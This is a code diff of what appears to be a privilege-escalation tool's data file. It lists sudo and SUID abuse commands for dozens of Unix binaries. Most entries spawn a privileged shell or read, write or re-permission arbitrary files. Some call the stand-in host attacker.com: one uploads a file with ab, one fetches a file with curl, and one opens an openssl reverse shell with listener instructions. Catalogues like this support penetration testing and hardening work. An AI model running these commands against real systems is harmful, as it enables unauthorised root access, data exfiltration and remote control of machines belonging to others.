-        "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n"
+        }
     ],
     "zypper": [
-        "sudo zypper x\n",
-        "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"
+        {
+            "code": "sudo zypper x\n",
+            "description": "This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges."
+        },
+        {
+            "code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"
+        }
     ]
 }
 # SUDO_BINS_END
@@ -1172,640 +2068,1105 @@ sudo_bins = {
 # SUID_BINS_START
 suid_bins = {
     "aa-exec": [
-        "./aa-exec /bin/sh -p"
+        {
+            "code": "./aa-exec /bin/sh -p"
+        }
     ],
     "ab": [
-        "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n"
+        {
+            "code": "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n",
+            "description": "Upload local file via HTTP POST request."
+        }
     ],
     "agetty": [
-        "./agetty -o -p -l /bin/sh -a root tty"
+        {
+            "code": "./agetty -o -p -l /bin/sh -a root tty"
+        }
     ],
     "alpine": [
-        "LFILE=file_to_read\n./alpine -F \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./alpine -F \"$LFILE\"\n"
+        }
     ],
     "ar": [
-        "TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
+        {
+            "code": "TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
+        }
     ],
     "arj": [
-        "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR\n"
+        {
+            "code": "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR\n",
+            "description": "The archive can also be prepared offline then uploaded."
+        }
     ],
     "arp": [
-        "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"
+        }
     ],
     "as": [
-        "LFILE=file_to_read\n./as @$LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./as @$LFILE\n"
+        }
     ],
     "ascii-xfr": [
-        "LFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\"\n"
+        }
     ],
     "ash": [
-        "./ash"
+        {
+            "code": "./ash"
+        }
     ],
     "aspell": [
-        "LFILE=file_to_read\n./aspell -c \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./aspell -c \"$LFILE\"\n"
+        }
     ],
     "atobm": [
-        "LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
+        {
+            "code": "LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
+        }
     ],
     "awk": [
-        "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n"
+        }
     ],
     "base32": [
-        "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"
+        {
+            "code": "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"
+        }
     ],
     "base64": [
-        "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"
+        {
+            "code": "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"
+        }
     ],
     "basenc": [
-        "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"
+        {
+            "code": "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"
+        }
     ],
     "basez": [
-        "LFILE=file_to_read\n./basez \"$LFILE\" | basez --decode\n"
+        {
+            "code": "LFILE=file_to_read\n./basez \"$LFILE\" | basez --decode\n"
+        }
     ],
     "bash": [
-        "./bash -p"
+        {
+            "code": "./bash -p"
+        }
     ],
     "bc": [
-        "LFILE=file_to_read\n./bc -s $LFILE\nquit\n"
+        {
+            "code": "LFILE=file_to_read\n./bc -s $LFILE\nquit\n"
+        }
     ],
     "bridge": [
-        "LFILE=file_to_read\n./bridge -b \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./bridge -b \"$LFILE\"\n"
+        }
     ],
     "busybox": [
-        "./busybox sh"
+        {
+            "code": "./busybox sh",
+            "description": "It may drop the SUID privileges depending on the compilation flags and the runtime configuration."
+        }
     ],
     "bzip2": [
-        "LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d\n"
+        {
+            "code": "LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d\n"
+        }
     ],
     "cabal": [
-        "./cabal exec -- /bin/sh -p"
+        {
+            "code": "./cabal exec -- /bin/sh -p"
+        }
     ],
     "capsh": [
-        "./capsh --gid=0 --uid=0 --"
+        {
+            "code": "./capsh --gid=0 --uid=0 --"
+        }
     ],
     "cat": [
-        "LFILE=file_to_read\n./cat \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./cat \"$LFILE\"\n"
+        }
     ],
     "chmod": [
-        "LFILE=file_to_change\n./chmod 6777 $LFILE\n"
+        {
+            "code": "LFILE=file_to_change\n./chmod 6777 $LFILE\n"
+        }
     ],
     "choom": [
-        "./choom -n 0 -- /bin/sh -p"
+        {
+            "code": "./choom -n 0 -- /bin/sh -p"
+        }
     ],
     "chown": [
-        "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"
+        {
+            "code": "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"
+        }
     ],
     "chroot": [
-        "./chroot / /bin/sh -p\n"
+        {
+            "code": "./chroot / /bin/sh -p\n"
+        }
     ],
     "clamscan": [
-        "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
+        {
+            "code": "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
+        }
     ],
     "cmp": [
-        "LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n"
+        {
+            "code": "LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n"
+        }
     ],
     "column": [
-        "LFILE=file_to_read\n./column $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./column $LFILE\n"
+        }
     ],
     "comm": [
-        "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"
+        {
+            "code": "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"
+        }
     ],
     "cp": [
-        "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n",
-        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n",
-        "LFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n"
+        },
+        {
+            "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n",
+            "description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)"
+        },
+        {
+            "code": "LFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\"\n",
+            "description": "This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another."
+        }
     ],
     "cpio": [
-        "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
-        "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n"
+        {
+            "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
+            "description": "The whole directory structure is copied to `$TF`."
+        },
+        {
+            "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n",
+            "description": "Copies `$LFILE` to the `$LDIR` directory."
+        }
     ],
     "cpulimit": [
-        "./cpulimit -l 100 -f -- /bin/sh -p"
+        {
+            "code": "./cpulimit -l 100 -f -- /bin/sh -p"
+        }
     ],
     "csh": [
-        "./csh -b"
+        {
+            "code": "./csh -b"
+        }
     ],
     "csplit": [
-        "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
+        {
+            "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
+        }
     ],
     "csvtool": [
-        "LFILE=file_to_read\n./csvtool trim t $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./csvtool trim t $LFILE\n"
+        }
     ],
     "cupsfilter": [
-        "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
+        }
     ],
     "curl": [
-        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n"
+        {
+            "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n",
+            "description": "Fetch a remote file via HTTP GET request."
+        }
     ],
     "cut": [
-        "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"
+        }
     ],
     "dash": [
-        "./dash -p"
+        {
+            "code": "./dash -p"
+        }
     ],
     "date": [
-        "LFILE=file_to_read\n./date -f $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./date -f $LFILE\n"
+        }
     ],
     "dd": [
-        "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"
+        {
+            "code": "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"
+        }
     ],
     "debugfs": [
-        "./debugfs\n!/bin/sh\n"
+        {
+            "code": "./debugfs\n!/bin/sh\n"
+        }
     ],
     "dialog": [
-        "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"
+        {
+            "code": "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"
+        }
     ],
     "diff": [
-        "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"
+        }
     ],
     "dig": [
-        "LFILE=file_to_read\n./dig -f $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./dig -f $LFILE\n"
+        }
     ],
     "distcc": [
-        "./distcc /bin/sh -p"
+        {
+            "code": "./distcc /bin/sh -p"
+        }
     ],
     "dmsetup": [
-        "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"
+        {
+            "code": "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"
+        }
     ],
     "docker": [
-        "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+        {
+            "code": "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+            "description": "The resulting is a root shell."
+        }
     ],
     "dosbox": [
-        "LFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
+        {
+            "code": "LFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n",
+            "description": "Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
+        }
     ],
     "ed": [
-        "./ed file_to_read\n,p\nq\n"
+        {
+            "code": "./ed file_to_read\n,p\nq\n"
+        }
     ],
     "efax": [
-        "LFILE=file_to_read\n./efax -d \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./efax -d \"$LFILE\"\n"
+        }
     ],
     "elvish": [
-        "./elvish"
+        {
+            "code": "./elvish"
+        }
     ],
     "emacs": [
-        "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
+        {
+            "code": "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
+        }
     ],
     "env": [
-        "./env /bin/sh -p"
+        {
+            "code": "./env /bin/sh -p"
+        }
     ],
     "eqn": [
-        "LFILE=file_to_read\n./eqn \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./eqn \"$LFILE\"\n"
+        }
     ],
     "espeak": [
-        "LFILE=file_to_read\n./espeak -qXf \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./espeak -qXf \"$LFILE\"\n"
+        }
     ],
     "expand": [
-        "LFILE=file_to_read\n./expand \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./expand \"$LFILE\"\n"
+        }
     ],
     "expect": [
-        "./expect -c 'spawn /bin/sh -p;interact'"
+        {
+            "code": "./expect -c 'spawn /bin/sh -p;interact'"
+        }
     ],
     "file": [
-        "LFILE=file_to_read\n./file -f $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./file -f $LFILE\n",
+            "description": "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
+        }
     ],
     "find": [
-        "./find . -exec /bin/sh -p \\; -quit"
+        {
+            "code": "./find . -exec /bin/sh -p \\; -quit"
+        }
     ],
     "fish": [
-        "./fish"
+        {
+            "code": "./fish"
+        }
     ],
     "flock": [
-        "./flock -u / /bin/sh -p"
+        {
+            "code": "./flock -u / /bin/sh -p"
+        }
     ],
     "fmt": [
-        "LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n",
+            "description": "This corrupts the output by wrapping very long lines at the given width."
+        }
     ],
     "fold": [
-        "LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n"
+        }
     ],
     "gawk": [
-        "LFILE=file_to_read\n./gawk '//' \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./gawk '//' \"$LFILE\"\n"
+        }
     ],
     "gcore": [
-        "./gcore $PID"
+        {
+            "code": "./gcore $PID"
+        }
     ],
     "gdb": [
-        "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
+        {
+            "code": "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
+            "description": "This requires that GDB is compiled with Python support."
+        }
     ],
     "genie": [
-        "./genie -c '/bin/sh'"
+        {
+            "code": "./genie -c '/bin/sh'"
+        }
     ],
     "genisoimage": [
-        "LFILE=file_to_read\n./genisoimage -sort \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./genisoimage -sort \"$LFILE\"\n",
+            "description": "The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data."
+        }
     ],
     "gimp": [
-        "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+        {
+            "code": "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+        }
     ],
     "grep": [
-        "LFILE=file_to_read\n./grep '' $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./grep '' $LFILE\n"
+        }
     ],
     "gtester": [
-        "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
+        {
+            "code": "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
+        }
     ],
     "gzip": [
-        "LFILE=file_to_read\n./gzip -f $LFILE -t\n"
+        {
+            "code": "LFILE=file_to_read\n./gzip -f $LFILE -t\n"
+        }
     ],
     "hd": [
-        "LFILE=file_to_read\n./hd \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./hd \"$LFILE\"\n"
+        }
     ],
     "head": [
-        "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"
+        }
     ],
     "hexdump": [
-        "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"
+        }
     ],
     "highlight": [
-        "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"
+        }
     ],
     "hping3": [
-        "./hping3\n/bin/sh -p\n"
+        {
+            "code": "./hping3\n/bin/sh -p\n"
+        }
     ],
     "iconv": [
-        "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
+        }
     ],
     "install": [
-        "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"
+        {
+            "code": "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"
+        }
     ],
     "ionice": [
-        "./ionice /bin/sh -p"
+        {
+            "code": "./ionice /bin/sh -p"
+        }
     ],
     "ip": [
-        "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n",
-        "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n"
+        {
+            "code": "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n"
+        },
+        {
+            "code": "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n",
+            "description": "This only works for Linux with CONFIG_NET_NS=y."
+        }
     ],
     "ispell": [
-        "./ispell /etc/passwd\n!/bin/sh -p\n"
+        {
+            "code": "./ispell /etc/passwd\n!/bin/sh -p\n"
+        }
     ],
     "jjs": [
-        "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
+        {
+            "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs",
+            "description": "This has been found working in macOS but failing on Linux systems."
+        }
     ],
     "join": [
-        "LFILE=file_to_read\n./join -a 2 /dev/null $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./join -a 2 /dev/null $LFILE\n"
+        }
     ],
     "jq": [
-        "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"
+        }
     ],
     "jrunscript": [
-        "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
+        {
+            "code": "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\"",
+            "description": "This has been found working in macOS but failing on Linux systems."
+        }
     ],
     "julia": [
-        "./julia -e 'run(`/bin/sh -p`)'\n"
+        {
+            "code": "./julia -e 'run(`/bin/sh -p`)'\n"
+        }
     ],
     "ksh": [
-        "./ksh -p"
+        {
+            "code": "./ksh -p"
+        }
     ],
     "ksshell": [
-        "LFILE=file_to_read\n./ksshell -i $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./ksshell -i $LFILE\n"
+        }
     ],
     "kubectl": [
-        "LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
+        {
+            "code": "LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
+        }
     ],
     "ld.so": [
-        "./ld.so /bin/sh -p"
+        {
+            "code": "./ld.so /bin/sh -p"
+        }
     ],
     "less": [
-        "./less file_to_read"
+        {
+            "code": "./less file_to_read"
+        }
     ],
     "logsave": [
-        "./logsave /dev/null /bin/sh -i -p"
+        {
+            "code": "./logsave /dev/null /bin/sh -i -p"
+        }
     ],
     "look": [
-        "LFILE=file_to_read\n./look '' \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./look '' \"$LFILE\"\n"
+        }
     ],
     "lua": [
-        "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
+        {
+            "code": "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
+        }
     ],
     "make": [
-        "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
+        {
+            "code": "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
+        }
     ],
     "mawk": [
-        "LFILE=file_to_read\n./mawk '//' \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./mawk '//' \"$LFILE\"\n"
+        }
     ],
     "minicom": [
-        "./minicom -D /dev/null\n"
+        {
+            "code": "./minicom -D /dev/null\n",
+            "description": "Start the following command to open the TUI interface, then:\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh -p`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\nAfter the shell, exit with `Ctrl-A x`.\n"
+        }
     ],
     "more": [
-        "./more file_to_read"
+        {
+            "code": "./more file_to_read"
+        }
     ],
     "mosquitto": [
-        "LFILE=file_to_read\n./mosquitto -c \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./mosquitto -c \"$LFILE\"\n"
+        }
     ],
     "msgattrib": [
-        "LFILE=file_to_read\n./msgattrib -P $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./msgattrib -P $LFILE\n"
+        }
     ],
     "msgcat": [
-        "LFILE=file_to_read\n./msgcat -P $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./msgcat -P $LFILE\n"
+        }
     ],
     "msgconv": [
-        "LFILE=file_to_read\n./msgconv -P $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./msgconv -P $LFILE\n"
+        }
     ],
     "msgfilter": [
-        "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n"
+        {
+            "code": "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n",
+            "description": "Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once."
+        }
     ],
     "msgmerge": [
-        "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n"
+        {
+            "code": "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n"
+        }
     ],
     "msguniq": [
-        "LFILE=file_to_read\n./msguniq -P $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./msguniq -P $LFILE\n"
+        }
     ],
     "multitime": [
-        "./multitime /bin/sh -p"
+        {
+            "code": "./multitime /bin/sh -p"
+        }
     ],
     "mv": [
-        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"
+        {
+            "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"
+        }
     ],
     "nasm": [
-        "LFILE=file_to_read\n./nasm -@ $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./nasm -@ $LFILE\n"
+        }
     ],
     "nawk": [
-        "LFILE=file_to_read\n./nawk '//' \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./nawk '//' \"$LFILE\"\n"
+        }
     ],
     "ncftp": [
-        "./ncftp\n!/bin/sh -p\n"
+        {
+            "code": "./ncftp\n!/bin/sh -p\n"
+        }
     ],
     "nft": [
-        "LFILE=file_to_read\n./nft -f \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./nft -f \"$LFILE\"\n"
+        }
     ],
     "nice": [
-        "./nice /bin/sh -p"
+        {
+            "code": "./nice /bin/sh -p"
+        }
     ],
     "nl": [
-        "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"
+        }
     ],
     "nm": [
-        "LFILE=file_to_read\n./nm @$LFILE\n"
+        {
+            "code": "LFILE=file_to_read\n./nm @$LFILE\n"
+        }
     ],
     "nmap": [
-        "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n"
+        {
+            "code": "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n",
+            "description": "The payload appears inside the regular nmap output."
+        }
     ],
     "node": [
-        "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"
+        {
+            "code": "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"
+        }
     ],
     "nohup": [
-        "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
+        {
+            "code": "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
+        }
     ],
     "od": [
-        "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"
+        }
     ],
     "openssl": [
-        "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
-        "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"
+        {
+            "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
+            "description": "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n"
+        },
+        {
+            "code": "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"
+        }
     ],
     "openvpn": [
-        "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n",
-        "LFILE=file_to_read\n./openvpn --config \"$LFILE\"\n"
+        {
+            "code": "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n"
+        },
+        {
+            "code": "LFILE=file_to_read\n./openvpn --config \"$LFILE\"\n",
+            "description": "The file is actually parsed and the first partial wrong line is returned in an error message."
+        }
     ],
     "pandoc": [
-        "LFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFILE\"\n"
+        }
     ],
     "paste": [
-        "LFILE=file_to_read\npaste $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\npaste $LFILE\n"
+        }
     ],
     "perf": [
-        "./perf stat /bin/sh -p\n"
+        {
+            "code": "./perf stat /bin/sh -p\n"
+        }
     ],
     "perl": [
-        "./perl -e 'exec \"/bin/sh\";'"
+        {
+            "code": "./perl -e 'exec \"/bin/sh\";'"
+        }
     ],
     "pexec": [
-        "./pexec /bin/sh -p"
+        {
+            "code": "./pexec /bin/sh -p"
+        }
     ],
     "pg": [
-        "./pg file_to_read"
+        {
+            "code": "./pg file_to_read"
+        }
     ],
     "php": [
-        "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
+        {
+            "code": "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
+        }
     ],
     "pidstat": [
-        "COMMAND=id\n./pidstat -e $COMMAND\n"
+        {
+            "code": "COMMAND=id\n./pidstat -e $COMMAND\n"
+        }
     ],
     "pr": [
-        "LFILE=file_to_read\npr -T $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\npr -T $LFILE\n"
+        }
     ],
     "ptx": [
-        "LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"\n"
+        }
     ],
     "python": [
-        "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+        {
+            "code": "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+        }
     ],
     "rc": [
-        "./rc -c '/bin/sh -p'"
